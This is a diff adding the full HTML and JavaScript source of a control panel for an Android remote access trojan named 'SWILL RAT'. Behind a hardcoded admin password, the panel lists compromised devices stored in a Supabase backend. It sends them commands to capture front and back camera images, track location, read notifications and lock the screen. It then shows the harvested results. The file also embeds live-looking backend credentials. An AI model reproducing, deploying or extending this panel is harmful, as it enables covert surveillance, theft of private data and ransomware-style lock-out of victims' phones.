@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SWILL RAT Panel</title>
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: monospace; background: #0a0a0a; color: #00ff00; padding: 20px; }
+        .container { max-width: 1400px; margin: auto; }
+        .login-container, .panel { background: #1a1a1a; border: 1px solid #00ff00; padding: 20px; margin: 20px 0; }
+        input, button, select, textarea { background: #000; border: 1px solid #00ff00; color: #00ff00; padding: 10px; margin: 5px; font-family: monospace; }
+        button { cursor: pointer; }
+        button:hover { background: #00ff00; color: #000; }
+        .device-card { border: 1px solid #00ff00; padding: 10px; margin: 10px 0; }
+        .result-area { background: #000; padding: 10px; margin-top: 10px; white-space: pre-wrap; }
+        .map { height: 300px; width: 100%; background: #333; margin-top: 10px; }
+        .hidden { display: none; }
+    </style>
+</head>
+<body>
+<div class="container" id="app">
+    <div id="loginPanel" class="login-container">
+        <h2>SWILL RAT - Admin Login</h2>
+        <input type="password" id="password" placeholder="Password">
+        <button onclick="login()">Login</button>
+    </div>
+    
+    <div id="adminPanel" class="panel hidden">
+        <h2>SWILL RAT Control Panel</h2>
+        <div id="devicesList"></div>
+        <div id="commandPanel">
+            <h3>Kirim Perintah</h3>
+            <select id="deviceSelect"></select>
+            <select id="commandSelect">
+                <option value="capture_front_cam">Front Camera</option>
+                <option value="capture_back_cam">Back Camera</option>
+                <option value="get_location">Get Location</option>
+                <option value="get_device_info">Device Info</option>
+                <option value="show_lockdown">Lock Screen</option>
+                <option value="hide_lockdown">Unlock Screen</option>
+                <option value="get_notifications">Get Notifications</option>
+            </select>
+            <button onclick="sendCommand()">Execute</button>
+        </div>
+        <div id="results" class="result-area"></div>
+    </div>
+</div>
+
+<script>
+    const SUPABASE_URL = "https://ggiozjfdnplutuonzvzk.supabase.co";
+    const SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImdnaW96amZkbnBsdXR1b256dnprIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODExOTc4ODQsImV4cCI6MjA5Njc3Mzg4NH0.7jcsxQ4Bxl9WI5Y6b4Q9YRd9LoQbmlXxDd-itqVtc8Y";
+    const ADMIN_PASSWORD = "admin230703";
+    
+    let supabase;
+    let currentDeviceId = null;
+    
+    function login() {
+        const pwd = document.getElementById('password').value;
+        if (pwd === ADMIN_PASSWORD) {
+            document.getElementById('loginPanel').classList.add('hidden');
+            document.getElementById('adminPanel').classList.remove('hidden');
+            initSupabase();
+            loadDevices();
+            setInterval(loadDevices, 5000);
+            setInterval(checkResults, 3000);
+        } else {
+            alert("Wrong password");
+        }
+    }
+    
+    function initSupabase() {
+        supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+    }
+    
+    async function loadDevices() {
+        const { data, error } = await supabase.from('devices').select('*').order('last_seen', { ascending: false });
+        if (error) return;
+        
+        const devicesDiv = document.getElementById('devicesList');
+        const deviceSelect = document.getElementById('deviceSelect');
+        
+        devicesDiv.innerHTML = data.map(d => `
+            <div class="device-card">
+                <strong>${d.device_name}</strong><br>
+                Android: ${d.android_version}<br>
+                Last Seen: ${d.last_seen}<br>
+                Locked: ${d.is_locked ? 'YES' : 'NO'}<br>
+                <button onclick="selectDevice('${d.id}')">Select</button>
+            </div>
+        `).join('');
+        
+        deviceSelect.innerHTML = '<option value="">Select Device</option>' + 
+            data.map(d => `<option value="${d.id}">${d.device_name}</option>`).join('');
+    }
+    
+    function selectDevice(id) {
+        currentDeviceId = id;
+        alert(`Device selected: ${id}`);
+    }
+    
+    async function sendCommand() {
+        const deviceId = document.getElementById('deviceSelect').value || currentDeviceId;
+        const command = document.getElementById('commandSelect').value;
+        
+        if (!deviceId) {
+            alert("Select device first");
+            return;
+        }
+        
+        const { data, error } = await supabase.from('commands').insert({
+            device_id: deviceId,
+            command: command,
+            status: 'pending',
+            created_at: new Date().toISOString()
+        });
+        
+        if (error) {
+            alert("Error: " + error.message);
+        } else {
+            alert("Command sent");
+        }
+    }
+    
+    async function checkResults() {
+        const { data, error } = await supabase.from('commands')
+            .select('*')
+            .eq('status', 'done')
+            .order('executed_at', { ascending: false })
+            .limit(10);
+        
+        if (error) return;
+        
+        const resultsDiv = document.getElementById('results');
+        resultsDiv.innerHTML = data.map(cmd => `
+            <div style="border-bottom:1px solid #00ff00; margin:5px 0;">
+                <strong>${cmd.command}</strong> | ${cmd.device_id}<br>
+                Result: ${JSON.stringify(cmd.result, null, 2)}
+            </div>
+        `).join('');
+    }
+</script>
+</body>
+</html>
